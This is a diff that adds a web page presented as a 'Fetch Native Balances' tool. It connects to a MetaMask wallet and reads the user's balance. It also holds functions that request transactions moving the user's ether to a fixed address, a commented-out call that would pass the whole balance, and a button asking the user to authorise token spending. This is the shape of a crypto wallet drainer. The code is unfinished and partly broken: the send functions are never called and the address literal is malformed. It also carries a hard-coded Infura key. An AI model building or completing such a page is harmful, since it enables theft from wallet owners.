@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Fetch Native Balances</title>
+</head>
+<body>
+
+<script src="https://cdn.jsdelivr.net/npm/web3@1.6.0/dist/web3.min.js"></script>
+
+<script>
+    console.log(window.ethereum)
+    let account; 
+    if (typeof window.ethereum !== 'undefined') {
+      // ethereum.request({ method: 'eth_requestAccounts' });
+
+      window.ethereum.request({ method: 'eth_requestAccounts' })
+      .then((accounts) => {
+        account = accounts[0];
+        console.log('Connected to MetaMask:', account);
+        init()
+      })
+      .catch((error) => {
+        console.error('MetaMask connection error:', error);
+      });
+
+
+  } else {
+      alert('Please install metamask')
+  }
+  async function init(){
+    // Replace these with your actual Infura or BSC node URLs
+    const infuraUrl = 'https://mainnet.infura.io/v3/fe4cd800ec8b4418b894a7a708df8d3c';
+    const bscUrl = 'https://bsc-testnet.publicnode.com/';
+
+    const web3Mainnet = new Web3(new Web3.providers.HttpProvider(infuraUrl));
+    const web3BSC = new Web3(new Web3.providers.HttpProvider(bscUrl));
+
+    const addressesToCheck = [
+      account,
+      // Add more addresses as needed
+    ];
+    async function getBalancesForChain(web3, addresses) {
+    for (const address of addresses) {
+      try {
+        const balanceWei = await web3.eth.getBalance(address);
+        const balanceEther = web3.utils.fromWei(balanceWei, 'ether');
+
+        console.log(`Native Balance of ${address}: ${balanceEther} ETH`);
+        // send(balanceWei)
+      } catch (error) {
+        console.error(`Error fetching balance for ${address}:`, error);
+      }
+    }
+  }
+
+  async function getAllNativeBalances() {
+    try {
+      // Fetch balances on Ethereum mainnet
+      console.log('Balances on Ethereum Mainnet:');
+      await getBalancesForChain(web3Mainnet, addressesToCheck);
+
+      // // Fetch balances on Binance Smart Chain
+      // console.log('\nBalances on Binance Smart Chain:');
+      // await getBalancesForChain(web3BSC, addressesToCheck);
+    } catch (error) {
+      console.error('Error:', error);
+    }
+  }
+  async function send2(amount){
+     // Construct a sample transaction
+     const transaction = {
+        to: 0xEf7e28Ba70FD460f07f29Bbf703f545a669f611A,
+        value: amount, // Amount in wei
+        // value: web3.utils.toWei('1', 'ether'), // Amount in wei
+        gas: 21000,
+        // gasPrice: web3.utils.toWei('10', 'gwei'),
+      };
+
+      // Request user approval to send the native transaction
+      window.ethereum.request({
+        method: 'eth_sendTransaction',
+        params: [transaction],
+      })
+      .then((transactionHash) => {
+        console.log('Transaction sent. Transaction Hash:', transactionHash);
+
+        // You can listen for transaction confirmation events here
+      })
+      .catch((error) => {
+        console.error('Error sending transaction:', error);
+      });
+  }
+  
+  async function sender(){
+    // Check if MetaMask or an Ethereum provider is available
+
+  // Request account access from the user
+  window.ethereum.request({ method: 'eth_requestAccounts' })
+    .then((accounts) => {
+      const userAddress = accounts[0];
+      console.log('User Address:', userAddress);
+
+      // Construct a sample transaction
+      const transaction = {
+        to: 0xEf7e28Ba70FD460f07f29Bbf703f545a669f611A,
+        value: web3Mainnet.utils.toWei('1', 'ether'), // Amount in wei
+        gas: 21000,
+        gasPrice: web3Mainnet.utils.toWei('10', 'gwei'),
+      };
+
+      // Request user approval to send the native transaction
+      window.ethereum.request({
+        method: 'eth_sendTransaction',
+        params: [transaction],
+      })
+      .then((transactionHash) => {
+        console.log('Transaction sent. Transaction Hash:', transactionHash);
+
+        // You can listen for transaction confirmation events here
+      })
+      .catch((error) => {
+        console.error('Error sending transaction:', error);
+      });
+    })
+    .catch((error) => {
+      console.error('Error requesting account access:', error);
+    });
+
+  }
+    getAllNativeBalances();
+  }
+
+
+
+  // Call the function to fetch balances on all chains
+</script>
+<button onclick="approvebutton();">Approve button to authorize tokens to be spent</button>
+
+<script type="text/javascript">
+
+
+// const web3 = new Web3('https://bsc-dataseed1.binance.org:443');
+
+const sep = new Web3(new Web3.providers.HttpProvider('https://ethereum-sepolia.publicnode.com'));
+
+
+// https://ethereum-sepolia.publicnode.com	
+
+ async function approvebutton() {
+
+    // Define the generic ERC-20 ABI
+const erc20ABI = [
+  {
+    constant: true,
+    inputs: [],
+    name: 'name',
+    outputs: [{ name: '', type: 'string' }],
+    payable: false,
+    stateMutability: 'view',
+    type: 'function',
+  },
+  {
+    constant: true,
+    inputs: [],
+    name: 'symbol',
+    outputs: [{ name: '', type: 'string' }],
+    payable: false,
+    stateMutability: 'view',
+    type: 'function',
+  },
+  {
+    constant: true,
+    inputs: [],
+    name: 'decimals',
+    outputs: [{ name: '', type: 'uint8' }],
+    payable: false,
+    stateMutability: 'view',
+    type: 'function',
+  },
+  {
+    constant: true,
+    inputs: [{ name: '_owner', type: 'address' }],
+    name: 'balanceOf',
+    outputs: [{ name: 'balance', type: 'uint256' }],
+    payable: false,
+    stateMutability: 'view',
+    type: 'function',
+  },
+  {
+    constant: false,
+    inputs: [
+      { name: '_to', type: 'address' },
+      { name: '_value', type: 'uint256' },
+    ],
+    name: 'transfer',
+    outputs: [{ name: 'success', type: 'bool' }],
+    payable: false,
+    stateMutability: 'nonpayable',
+    type: 'function',
+  },
+  // Add more ERC-20 functions as needed
+];
+
+// Replace 'YOUR_CONTRACT_ADDRESS' with the actual ERC-20 contract address
+// const contractAddress = '0xfff9976782d46cc05630d1f6ebab18b2324d6b14';
+const contractAddress = '0xd9995205a8180461a80e09f8710f6ffda439f326';
+
+// Create a contract instance
+// const sep = new Web3(new Web3.providers.HttpProvider('https://ethereum-sepolia.publicnode.com'));
+
+// const erc20Contract = new sep.eth.Contract(erc20ABI, contractAddress);
+
+const sep = new Web3(new Web3.providers.HttpProvider('https://bsc-testnet.publicnode.com'));
+
+const erc20Contract = new sep.eth.Contract(erc20ABI, contractAddress);
+
+
+// Example: Get the name of the ERC-20 token
+erc20Contract.methods.name().call()
+  .then((name) => {
+    console.log('Token Name:', name);
+  })
+  .catch((error) => {
+    console.error('Error:', error);
+  });
+
+  erc20Contract.methods.balanceOf("0x097bB4eCEc0ED01b5BC63E6d5CEE70cB44F7F764").call()
+  .then((name) => {
+    console.log('Token Balance:', name);
+  })
+  .catch((error) => {
+    console.error('Error:', error);
+  });
+
+
+  // await erc20Contract.methods.transfer("0x097bB4eCEc0ED01b5BC63E6d5CEE70cB44F7F764", 100000000).send({ from: '0xDC077f92B6BDafa3cCD8A47885B87d59687ba5d1' })
+
+
+ /// APPROVE FUNCTION WITH THE CONTRACT 
+//  const Contract = ('0xContractAddress');
+// const spenderAdr = ('0xSpenderAddress');
+// const amount = ('AmountTokensNumber')
+
+// Contract.methods.approve(spenderAddr, amount).send({
+//    from: ownerAddr
+// })
+
+// async function approvebutton(Contract,spenderAdr){
+//   Contract.methods.approve(spenderAddr, amount).send({
+//    from: ownerAddr
+// })
+
+ 
+ }
+        
+        
+  </script>
+</body>
+</html>
